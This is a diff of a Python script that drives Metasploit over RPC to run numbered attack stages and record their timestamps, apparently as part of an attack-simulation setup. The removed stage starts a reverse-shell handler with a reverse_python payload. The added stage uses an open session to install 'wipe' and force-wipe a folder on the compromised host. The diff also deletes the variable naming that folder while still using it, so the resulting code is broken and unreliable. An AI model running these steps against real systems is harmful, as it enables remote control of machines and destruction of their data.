@@ -12,31 +12,29 @@ def record_timestamp(folder, output_time_file):
 
 def main(argv):
     if len(argv) != 4:
-        print("Usage: {} Folder local_ip target_ip duration flag_finish".format(argv[0]))
+        print("Usage: {} Folder local_ip target_ip".format(argv[0]))
 
     folder = argv[1]
     my_ip = argv[2]
     target_ip = argv[3]
-    wipe_disk_folder = "/tmp"
 
     client = MsfRpcClient('kali')
-    
-    # start step 6
-    output_time_file = 'time_stage_6_start.txt'
+
+    # start step 7
+    output_time_file = 'time_stage_7_start.txt'
     record_timestamp(folder, output_time_file)
     time.sleep(2)
 
-    exploit = client.modules.use('exploit', 'multi/handler')
-    payload = client.modules.use('payload', 'cmd/unix/reverse_python')
-    payload['LHOST'] = my_ip
-
-    exploit.execute(payload=payload)
+    shell = client.sessions.session('4')
+    shell.write('apt install wipe -y')
+    time.sleep(30)
+    shell.write("wipe -f {0}".format(wipe_disk_folder))
 
     while client.jobs.list:
         time.sleep(1)
 
     time.sleep(10)
-    output_time_file = 'time_stage_6_end.txt'
+    output_time_file = 'time_stage_7_end.txt'
     record_timestamp(folder, output_time_file)
     time.sleep(2)
 
